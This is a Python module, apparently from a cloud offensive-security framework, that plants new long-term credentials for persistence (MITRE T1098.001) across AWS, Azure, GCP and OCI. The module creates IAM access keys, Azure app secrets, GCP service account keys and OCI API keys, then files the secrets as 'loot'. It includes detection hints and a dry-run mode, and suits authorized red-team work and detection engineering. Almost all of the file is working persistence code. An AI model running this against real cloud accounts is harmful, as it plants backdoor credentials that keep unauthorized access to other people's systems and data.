# ================================================================
# TECHNIQUE: persistence/create_credential
# ----------------------------------------------------------------
# TACTIC:    Persistence (TA0003)
# TECHNIQUE: T1098.001 — Additional Cloud Credentials
#
# PURPOSE:   Unified module to create new long-term credentials
#            (API keys, secrets, service account keys) for any
#            major cloud provider principal.
#
# PROVIDERS: AWS, Azure, GCP, OCI
#
# PARAMETERS (via ctx.params):
#   target (optional) — IAM User (AWS), App Object ID (Azure),
#                       SA Email (GCP), or User OCID (OCI).
#                       Defaults to self where applicable.
#   alias  (optional) — Friendly name/description for the new key.
#   pub    (optional) — PEM public key (required for OCI).
#   key    (optional) — PEM private key (for OCI auto-import).
#
# DETECTION (Blue Team):
#   Monitor for 'CreateAccessKey' (AWS), 'addPassword' (Azure),
#   'CreateServiceAccountKey' (GCP), and 'UploadApiKey' (OCI).
#   Alert: Credentials created for high-privilege admins or service accounts.
#
# SAFE:     No — creates new persistent credentials.
# ================================================================

from __future__ import annotations

import base64
import json
import logging
import urllib.request
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, technique

logger = logging.getLogger(__name__)

# ----------------------------------------------------------------
# Loot schema — Unified display for all providers
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = "results"
LOOT_SCHEMA = [
    ("principal", "Target Principal", "bold cyan"),
    ("credential", "New Credential/ID", "bold yellow"),
    ("secret", "Secret/Fingerprint", "bold red"),
    ("status", "Status", "green"),
]


@technique(
    technique_id="persistence/create_credential",
    tactic="persistence",
    mitre_id="T1098.001",
    providers=["aws", "azure", "gcp", "oci"],
    severity="high",
    safe=False,
    safe_mode_available=True,
    description="Unified module to create additional cloud credentials for persistence.",
    capabilities=frozenset({"url_open"}),
    loot_schema=LOOT_SCHEMA,
    loot_items_key=LOOT_ITEMS_KEY,
    parameters=[
        Parameter(
            "target",
            "The target user, service account, or application ID.",
            required=False,
            example="morpheus",
        ),
        Parameter(
            "alias",
            "A friendly name for the new credential.",
            default="qm-persistence",
            example="backdoor-key",
        ),
        Parameter(
            "pub", "Public key in PEM format (Required for OCI).", example="ssh-rsa AAAAB3..."
        ),
        Parameter(
            "key",
            "Private key in PEM format (For automatic workspace import).",
            example="-----BEGIN RSA...",
        ),
    ],
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute credential creation across cloud providers."""
    if ctx.provider_name == "aws":
        return _create_aws(ctx)
    if ctx.provider_name == "azure":
        return _create_azure(ctx)
    if ctx.provider_name == "gcp":
        return _create_gcp(ctx)
    if ctx.provider_name == "oci":
        return _create_oci(ctx)

    return {"error": f"Provider {ctx.provider_name} not implemented.", "results": []}


def _create_aws(ctx: ExecutionContext) -> dict[str, Any]:
    iam = ctx.session.client("iam")
    user_name = ctx.get_param("target", "").strip()

    if not user_name:
        who = ctx.whoami()
        if who.principal_type == "user":
            user_name = who.friendly_name
        else:
            return {
                "error": "AWS requires 'target' (User Name) when not authenticated as a User.",
                "results": [],
            }

    if ctx.safe_mode:
        return {
            "provider": "aws",
            "results": [
                {
                    "principal": user_name,
                    "credential": "NEW-KEY-ID",
                    "secret": "REDACTED",
                    "status": "would_create",
                }
            ],
        }

    try:
        ctx.info(f"AWS: creating access key for user {user_name}...")
        resp = iam.create_access_key(UserName=user_name)
        key_id = resp["AccessKey"]["AccessKeyId"]
        secret = resp["AccessKey"]["SecretAccessKey"]

        # Import into workspace
        ctx.workspace.add_credential(
            provider="aws",
            credential_type="access_key",
            friendly_name=f"persistence-{user_name}",
            principal_id=user_name,
            secret_data=json.dumps({"access_key": key_id, "secret_key": secret}),
            obtained_via="persistence/create_credential",
        )

        ctx.success(f"Created IAM access key {key_id} for {user_name}")
        return {
            "provider": "aws",
            "results": [
                {
                    "principal": user_name,
                    "credential": key_id,
                    "secret": secret,
                    "status": "Created",
                }
            ],
        }
    except Exception as e:
        return {"error": str(e), "results": []}


def _create_azure(ctx: ExecutionContext) -> dict[str, Any]:
    app_object_id = ctx.get_param("target", "").strip()
    secret_name = ctx.get_param("alias", "qm-persistence").strip()

    if not app_object_id:
        return {"error": "Azure requires 'target' (Application Object ID).", "results": []}

    if ctx.safe_mode:
        return {
            "provider": "azure",
            "results": [
                {
                    "principal": app_object_id,
                    "credential": "NEW-SECRET",
                    "secret": "REDACTED",
                    "status": "would_add",
                }
            ],
        }

    try:
        token = ctx.session.get_token("https://graph.microsoft.com/.default").token

        # 1. Add Secret
        ctx.info(f"Azure: adding secret to application {app_object_id[:8]}...")
        req = urllib.request.Request(
            f"https://graph.microsoft.com/v1.0/applications/{app_object_id}/addPassword",
            data=json.dumps({"passwordCredential": {"displayName": secret_name}}).encode(),
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req) as f:
            resp = json.loads(f.read().decode())

        secret_val = resp.get("secretText")

        # 2. Resolve metadata for import
        req_app = urllib.request.Request(
            f"https://graph.microsoft.com/v1.0/applications/{app_object_id}",
            headers={"Authorization": f"Bearer {token}"},
            method="GET",
        )
        with urllib.request.urlopen(req_app) as f:
            app_info = json.loads(f.read().decode())

        client_id = app_info.get("appId")
        who = ctx.whoami()
        tenant_id = who.tenant_id

        ctx.workspace.upsert_account(
            account_id=tenant_id, provider="azure", name=f"Tenant {tenant_id}", account_type="tenant"
        )
        ctx.workspace.add_credential(
            provider="azure",
            credential_type="app_secret",
            friendly_name=f"persistence-{app_info.get('displayName', 'app')}",
            principal_id=client_id,
            secret_data=json.dumps(
                {"client_id": client_id, "client_secret": secret_val, "tenant_id": tenant_id}
            ),
            obtained_via="persistence/create_credential",
        )

        ctx.success(f"Added secret to Azure App {client_id}")
        return {
            "provider": "azure",
            "results": [
                {
                    "principal": client_id,
                    "credential": secret_name,
                    "secret": secret_val,
                    "status": "Created",
                }
            ],
        }
    except Exception as e:
        return {"error": str(e), "results": []}


def _create_gcp(ctx: ExecutionContext) -> dict[str, Any]:
    sa_email = ctx.get_param("target", "").strip()
    if not sa_email:
        return {"error": "GCP requires 'target' (Service Account Email).", "results": []}

    if ctx.safe_mode:
        return {
            "provider": "gcp",
            "results": [
                {
                    "principal": sa_email,
                    "credential": "NEW-KEY-ID",
                    "secret": "REDACTED",
                    "status": "would_create",
                }
            ],
        }

    try:
        from googleapiclient.discovery import build

        iam = build("iam", "v1", credentials=ctx.session)

        ctx.info(f"GCP: creating new JSON key for {sa_email}...")
        key = (
            iam.projects()
            .serviceAccounts()
            .keys()
            .create(name=f"projects/-/serviceAccounts/{sa_email}", body={})
            .execute()
        )

        key_id = key.get("name", "").split("/")[-1]
        key_b64 = key.get("privateKeyData")
        key_json = base64.b64decode(key_b64).decode()
        key_dict = json.loads(key_json)
        project_id = key_dict.get("project_id", "unknown")

        ctx.workspace.upsert_account(
            account_id=project_id, provider="gcp", name=project_id, account_type="project"
        )
        ctx.workspace.add_credential(
            provider="gcp",
            credential_type="service_account",
            friendly_name=f"persistence-{sa_email.split('@')[0]}",
            account_id=project_id,
            secret_data=key_json,
            obtained_via="persistence/create_credential",
        )

        ctx.success(f"Created GCP SA key {key_id} for {sa_email}")
        return {
            "provider": "gcp",
            "results": [
                {
                    "principal": sa_email,
                    "credential": key_id,
                    "secret": key_b64[:40] + "...",
                    "status": "Created",
                }
            ],
        }
    except Exception as e:
        return {"error": str(e), "results": []}


def _create_oci(ctx: ExecutionContext) -> dict[str, Any]:
    user_id = ctx.get_param("target", "").strip()
    public_key = ctx.get_param("pub", "").strip()
    private_key = ctx.get_param("key", "").strip()

    if not public_key:
        return {"error": "OCI requires 'pub' (Public Key) parameter.", "results": []}

    if not user_id:
        user_id = ctx.whoami().principal_id

    if ctx.safe_mode:
        return {
            "provider": "oci",
            "results": [
                {
                    "principal": user_id,
                    "credential": "UPLOAD",
                    "secret": "REDACTED",
                    "status": "would_upload",
                }
            ],
        }

    try:
        import oci

        config = ctx.session["config"]
        signer = ctx.session.get("signer")
        identity = (
            oci.identity.IdentityClient(config={}, signer=signer)
            if signer
            else oci.identity.IdentityClient(config)
        )

        ctx.info(f"OCI: uploading API key to user {user_id[:20]}...")
        resp = identity.upload_api_key(
            user_id, oci.identity.models.CreateApiKeyDetails(key=public_key)
        )
        fingerprint = resp.data.fingerprint
        tenancy_id = config.get("tenancy")

        if private_key:
            ctx.workspace.upsert_account(
                account_id=tenancy_id, provider="oci", name=f"Tenancy {tenancy_id}", account_type="tenancy"
            )
            ctx.workspace.add_credential(
                provider="oci",
                credential_type="api_key",
                friendly_name=f"persistence-{user_id.split('.')[-1]}",
                principal_id=user_id,
                secret_data=json.dumps(
                    {
                        "user": user_id,
                        "fingerprint": fingerprint,
                        "tenancy": tenancy_id,
                        "region": config.get("region"),
                        "key_content": private_key,
                    }
                ),
                obtained_via="persistence/create_credential",
            )

        ctx.success(f"Uploaded OCI API key for {user_id}")
        return {
            "provider": "oci",
            "results": [
                {
                    "principal": user_id,
                    "credential": "API Key",
                    "secret": fingerprint,
                    "status": "Created",
                }
            ],
        }
    except Exception as e:
        return {"error": str(e), "results": []}
